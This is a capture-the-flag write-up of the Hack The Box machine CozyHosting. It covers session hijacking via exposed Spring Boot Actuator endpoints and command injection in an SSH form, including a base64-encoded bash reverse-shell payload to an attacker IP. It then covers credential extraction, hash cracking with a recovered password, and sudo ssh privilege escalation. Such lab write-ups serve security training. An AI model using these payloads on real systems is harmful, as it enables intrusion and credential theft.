---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# CozyHosting

## Summary

[Cozyhosting](https://app.hackthebox.com/machines/CozyHosting) is an <mark style="color:green;">easy-rated</mark> challenge that emphasizes **web testing**. Gaining a foothold can be challenging if you're unfamiliar with **Spring Boot**. However, once identified, using a Spring-specific wordlist for directory busting can uncover exposed **Actuator endpoints**. Among these endpoints, one allows us to **hijack another user's session**, enabling a **command injection** technique on the application's SSH functionality, thus **establishing our foothold**. Further **system enumeration** reveals a JAR file containing plaintext credentials for the **PostgreSQL** [**DBMS**](#user-content-fn-1)[^1]. This, in turn, grants access to the hash of the DBA[^2], facilitating **lateral movement**. Leveraging the user's `sudo` permissions, we can then **escalate our privileges**.

<table><thead><tr><th width="83" align="right">Step</th><th width="224">Action</th><th width="158">Tool</th><th>Gained</th></tr></thead><tbody><tr><td align="right">1</td><td>Web server enumeration</td><td><a href="../../tools/web/dirbusting/fuff.md">fuff</a>, browser</td><td>Identified framework</td></tr><tr><td align="right">2</td><td>Session hijacking</td><td><a href="../../tools/web/dirbusting/fuff.md">fuff</a>, <a href="https://portswigger.net/burp/communitydownload">Burp</a></td><td>Elevated access to the web app</td></tr><tr><td align="right">3</td><td>Command injection</td><td><a href="https://portswigger.net/burp/communitydownload">Burp</a></td><td>Foothold</td></tr><tr><td align="right">4</td><td>Host enumeration</td><td><a data-footnote-ref href="#user-content-fn-3">LoTL</a></td><td>Plaintext credentials</td></tr><tr><td align="right">5</td><td>Database enumeration</td><td><a href="../../services/sql/postgresql-5432.md#usage">psql</a></td><td>Privilege escalation</td></tr><tr><td align="right">6</td><td>Permission enumeration</td><td>LoTL, <a href="https://gtfobins.github.io/">GTFOBins</a></td><td>Rooted</td></tr></tbody></table>

## Recon

### Port Scan

Let's start with our usual [port scan](../../tools/port-scanners/nmap.md#nmap-scan).

{% code overflow="wrap" %}
```bash
# Using the nmap-scan script
$ nmap-scan.sh 10.10.11.230
Creating directory...
[sudo] password for x7331:
Performing initial scan...
Extracting ports...
Performing an aggresive scan on open ports...
All done! See results: less scans/aggressive_scan.nmap

# Displaying the results
$ cat scans/aggressive_scan.nmap
# Nmap 7.94SVN scan initiated Sat Apr 27 18:16:46 2024 as: nmap -T4 --min-rate=10000 -A -p 22,80, -oA scans/aggressive_scan 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
{% endcode %}

Not much there, just 2 ports open: an SSH server and a web server which redirects us to `http://cozyhosting.htb`. The latter probably will be our main focus, so let's add this to our local DNS file.

```bash
$ grep cozy /etc/hosts
10.10.11.230    cozyhosting.htb
```

### Web Enumeration

As usual, we will go through our [web checklist](../../tools/web/web-checklist.md) by checking what web technologies are there, manually inspecting the web server, and start our fuzzing scans.

{% code overflow="wrap" %}
```bash
# Checking what technologies the web server uses
$ whatweb cozyhosting.htb
http://cozyhosting.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```
{% endcode %}

Visiting the web server via our browser, it seems like almost nothing but the `/login` page works. Trying to login with weak credentials (`admin:admin`) does not work. Searching for known vulnerabilities and default credentials does not lead us anywhere either. Our [fuzzing](../../tools/web/dirbusting/) scans for subdomains and vhosts do not return anything, and the directory scan only reveals an `/admin` directory, which we can't access without credentials, and an `/error` directory (Figure 1).

{% code overflow="wrap" %}
```bash
# Dirbusting the domain
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -c -ac -ic
```
{% endcode %}

<figure><img src="../../.gitbook/assets/cozyhosting_dirbusting.png" alt=""><figcaption><p>Figure 1: Dirbusting the domain with <code>fuff</code>.</p></figcaption></figure>

## Foothold

### Identifying Framework

Checking the `/error` directory reveals something interesting: a `Whitelabel Error Page` (Figure 2.2). This is the default error page of the **Spring Boot framework** (Figure 2.4).

{% hint style="info" %}
[Spring](https://spring.io/projects/spring-framework) is a framework for building Java applications, and [Spring Boot](https://spring.io/projects/spring-boot) is an extension of Spring that focuses on simplifying the setup and configuration of Spring applications, especially for web applications. It provides defaults and conventions to minimize the boilerplate code required to get started with a Spring project.
{% endhint %}

<figure><img src="../../.gitbook/assets/cozyhosting_whitelabel.png" alt=""><figcaption><p>Figure 2: The <code>/error</code> directory reveals the framework in use.</p></figcaption></figure>

Knowing that, we can re-fuzz the domain using a Spring Boot-specific wordlist. Doing that returns much more interesting results than our first attempt. Spring Boot's [actuator](https://www.baeldung.com/spring-boot-actuators#understanding-actuator) is a set of built-in tools and features that provide insight into the internal state of the application when it's running in a production environment and its endpoints should not be public facing, as it is mostly used as a debugging tool. Out of them, [`actuator/sessions`](https://www.baeldung.com/spring-boot-actuators#3-predefined-endpoints) is probably the one we should focus as it "_lists HTTP sessions, given we are using Spring Session_" (Figure 3).

{% code overflow="wrap" %}
```bash
# Fuzzing the domain with a framework-specific wordlist
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -c -ac -ic
```
{% endcode %}

<figure><img src="../../.gitbook/assets/cozyhosting_spring_fuzz.png" alt=""><figcaption><p>Figure 3: Fuzzing the domain with a framework-specific list.</p></figcaption></figure>

### Leveraging Actuator

Our plan is as follows:

1. We will list all active Sping Boot sessions by visiting the `/actuator/sessions` endpoint (Figure 4.1).
2. If an account is authenticated, we will steal its cookie value (Figure 4.2).
3. Then, we will use its cookie, to make the web application to think that we are him, and hijack its session (Figure 4.3).
4. Finally, if all goes well, we will be logged in with the privileges of the hijacked account (Figure 4.4).

<figure><img src="../../.gitbook/assets/cozyhosting_admin_login.png" alt=""><figcaption><p>Figure 4: Leveraging <code>kanderson's</code> cookie to log into as privileged users.</p></figcaption></figure>

There are not much on the dashboard page, other than an SSH function at the bottom of the page. Putting the IP address of our attack host results in an error message (Figure 5).

<figure><img src="../../.gitbook/assets/cozyhosting_ssh_function.png" alt=""><figcaption><p>Figure 5: The SSH functionality of Cozyhosting.</p></figcaption></figure>

### Command Injection

Intercepting and playing around with the above HTTP request in Burp, reveals that it uses the `ssh` bash command (Figure 6), so it is probable that we can perform some form of [command injection](../../tl-dr/web/injections/command-injection.md) and get a reverse shell back.

<figure><img src="../../.gitbook/assets/cozyhosting_ssh_help.png" alt=""><figcaption><p>Figure 6: Sending an empty <code>username</code> parameter leads to the <code>ssh</code> help menu.</p></figcaption></figure>

By sending a username and our attack host's IP address, we get a `Connection time out` error message (Figure 7).

<figure><img src="../../.gitbook/assets/cozyhosting_ssh_1.png" alt=""><figcaption><p>Figure 7: Figuring out how the SSH functionality works at the back end.</p></figcaption></figure>

Putting a common CI[^4] testing payload, gives us back a different error message related to **whitespaces** (Figure 8).

```
# Payload 1
host=10.10.14.22&username=;sleep 2;
```

<figure><img src="../../.gitbook/assets/cozyhosting_whitespaces.png" alt=""><figcaption></figcaption></figure>

Whitespaces are commonly blacklisted, but, luckily for us, there are a [lot of ways](../../tl-dr/web/injections/command-injection.md#blacklisted-characters) to bypass this restriction, one of them is [brace expansion](https://www.geeksforgeeks.org/bash-brace-expansion-in-linux-with-examples/) (Figure 9).

```
# Payload 2
host=10.10.14.22&username=;{sleep,2};
```

<figure><img src="../../.gitbook/assets/cozyhosting_bypass_whitespaces.png" alt=""><figcaption><p>Figure 9: Bypassing whitespace restrictions.</p></figcaption></figure>

We are successful on injecting our `sleep` command, so we now have to create a revershel shell payload. We will need to [encode our payload](../../tl-dr/web/injections/command-injection.md#encoding) and get rid any "dangerous" characters, such as `+` and `=`, which have their own interpretation within HTTP requests.

```bash
# Encoding the revershe shell code
$ echo 'bash -i >& /dev/tcp/10.10.14.22/1337 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi8xMzM3IDA+JjEK
# Removing the '+' symbols
$ echo 'bash -i  >& /dev/tcp/10.10.14.22/1337  0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvMTMzNyAgMD4mMQo=
# Removing the equal sign at the end
$ echo 'bash -i  >& /dev/tcp/10.10.14.22/1337  0>&1 ' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvMTMzNyAgMD4mMSAK
```

Once our encoded payload is ready, we will pipe it for decoding and then to bash, while making sure to not include any whitespaces among the piped commands. With that, we will start a listener, send the request, and catch a reverse shell back (Figure 10).

{% code overflow="wrap" %}
```
# Payload 3
host=10.10.14.22&username=;{echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvMTMzNyAgMD4mMSAK}|{base64,-d}|bash;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/cozyhosting_rce.png" alt=""><figcaption><p>Figure 10: Injecting the payload and catching the reverse shell.</p></figcaption></figure>

Before moving forward, we make our life easier by [upgrading our shell](../../tools/shells/upgrade.md#script-python).

```bash
# Upgrading our shell
which script
script /dev/null -c /bin/bash
^Z
echo $TERM && stty size
stty raw -echo; fg
stty rows 51 cols 209
export TERM=xterm
```

## Privilege Escalation

### System Enumeration

In the working directory there is a JAR file which contains a lot of files, so we will transfer it to our attack host and inspect it there (Figure 11).

```bash
# Starting a Python HTTP server on the target host
python3 -m http.server 8888
# Downloading the JAR file to the attack host
wget http://cozyhosting.htb:8888/cloudhosting-0.0.1.jar -O ch.jar
```

<figure><img src="../../.gitbook/assets/cozyhosting_jar_transfer.png" alt=""><figcaption><p>Figure 11: Transferring the JAR file to our attack host.</p></figcaption></figure>

This JAR contains 47 directories and 266 files, so enumerating them 1 by 1 is definetely not an option. We will create a simple bash script to do that for us which will then tweak if needed.

{% code title="search_pass.sh" overflow="wrap" %}
```bash
#!/bin/bash

# Read every file starting from the cj_jar directory
find ch_jar/ -type f 2>/dev/null | while read -r file; do
        # Check if the file contains the word password
        if [[ -n $(cat "${file}" | grep password) ]]; then
                # Print the filename
                echo -e "${file} \n"
                # Print the line along with the previous 5 lines
                echo -e "Content:\n $(cat ${file} | grep --before-context=5 password) \n"
        fi
done
```
{% endcode %}

We will give the script execute permissions (`x`) and hope for the best (Figure 12).

```bash
# Assigning execute pemission to the script
$ chmod +x search_pass.sh
# Executing the script
$ ./search_pass.sh
```

<figure><img src="../../.gitbook/assets/cozyhosting_search_pass.png" alt=""><figcaption><p>Figure 12: Searching for the <code>password</code> word.</p></figcaption></figure>

We find plaintext credentials within the `application.properties` file, which is where the Spring Boot's actuators are configured.

### Database Enumeration

We can use the credentials found to connect and then enumerate the PostgreSQL DMBS.

```bash
# Connecting to the PostgreSQL server
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
Password for user postgres:
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
# Listing databases
postgres=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
# Connecting to the cozyhosting database
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
# Listing tables
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
# Dumping data from the users table
cozyhosting=# select * from users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
# Exiting database
cozyhosting=# \q
```

The `users` table contains the hash of the `admin` account. We can copy that into a file locally (`admin_hash`) and pass it to [`hashcat`](../../tools/passwords/hashcat.md).

```bash
# Writing the hash into a file
nano admin_hash
# Identifying the hash type
hashcat admin_hash /usr/share/wordlists/rockyou
# Cracking the hash
hashcat -m3200 admin_hash /usr/share/wordlists/rockyou
# Displaying the results
$ hashcat -m3200 admin_hash /usr/share/wordlists/rockyou --show
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

### Permissions

The cozyhosting machine has only 2 users: `root` and `josh`. Trying the password for the former does not work, but it does for the latter which has some interesting `sudo` permissions (Figure 13).&#x20;

```bash
# Switching users to josh
su josh
# Changing to its home directory
cd ~
# Listing the directory's content
ls -l
# Reading the user flag
cat user.txt
# Checking its sudo permissions
sudo -l
```

<figure><img src="../../.gitbook/assets/cozyhosting_josh.png" alt=""><figcaption><p>Figure 13: Switching user to <code>josh</code> and checking its permissions.</p></figcaption></figure>

Checking GTFOBins, as always when we find a binary that can be executed with elevated permissions, we find out that [there is a way](https://gtfobins.github.io/gtfobins/ssh/#sudo) to privilege escalate via the `sudo` and `ssh` combination.

```bash
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# cat /root/root.txt
7e3<REDACTED>4de
```

[^1]: Database Management System

[^2]: Database Admin

[^3]: Living off The Land

[^4]: Command Injection
